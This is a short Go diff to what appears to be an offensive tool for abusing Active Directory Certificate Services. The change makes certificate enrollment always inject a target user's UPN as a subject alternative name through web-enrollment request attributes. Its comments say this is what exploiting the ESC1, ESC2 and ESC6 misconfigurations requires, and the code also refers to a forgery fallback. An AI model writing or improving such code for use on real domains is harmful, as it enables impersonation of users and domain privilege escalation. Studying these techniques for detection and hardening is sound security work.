@@ -124,11 +124,14 @@ func EnrollCertificate(cfg *ADCSConfig, templateName, targetUPN string, sanInjec
 		return forgeFallback(certKey, targetUPN)
 	}
 
-	// Build SAN attribute for sanInject mode (ESC6)
+	// Always pass UPN SAN via CertAttrib request attributes.
+	// certsrv web enrollment ignores SAN extensions in the CSR — it only
+	// processes SAN from request attributes. This is required for ESC1/ESC2
+	// (enrollee supplies subject) and ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2).
 	sanAttrib := ""
-	if sanInject {
+	if targetUPN != "" {
 		sanAttrib = fmt.Sprintf("SAN:upn=%s", targetUPN)
-		fmt.Printf("[*] SAN injection via request attributes: %s\n", sanAttrib)
+		fmt.Printf("[*] SAN via request attributes: %s\n", sanAttrib)
 	}
 
 	// Submit CSR via HTTP web enrollment
